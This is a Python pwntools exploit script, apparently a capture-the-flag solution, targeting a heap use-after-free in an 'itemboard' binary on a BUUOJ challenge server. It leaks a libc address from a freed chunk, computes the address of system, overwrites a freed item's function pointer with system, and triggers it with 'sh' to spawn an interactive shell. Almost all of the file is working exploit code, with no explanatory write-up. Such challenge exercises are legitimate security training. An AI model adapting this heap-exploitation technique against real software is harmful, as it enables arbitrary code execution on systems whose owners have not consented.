# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './itemboard'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
# libc = elf.libc
libc = ELF('./libc-old/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28035'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(name , size , text):
    cmd(1)
    sla('Item name?',name)
    sla('len?',size)
    sla('Description?',text)

def show(idx):
    cmd(3)
    sla('item?',idx)

def delete(idx):
    cmd(4)
    sla('item?',idx)

# one_gad = one_gadget(libc.path)

add('sh\x00' , 0x90 , 'sh\x00')
add('aaa' , 0x28 , '114')
delete(0)
show(0)

__malloc_hook = l64() - 0x68
libc.address = __malloc_hook - libc.sym['__malloc_hook']
lg('libc.address',libc.address)
system = libc.sym['system']

delete(1)
add('a' , 0x18 , 'a'*0x10 + p64(system))
delete(2)
add('a' , 0x18 , 'sh\x00')
delete(0)
# 感觉这题开不开保护没有意义啊，程序0截断多写几次就行了


p.interactive()

'''
@File    :   itemboard.py
@Time    :   2021/08/27 14:38:21
@Author  :   Niyah 
'''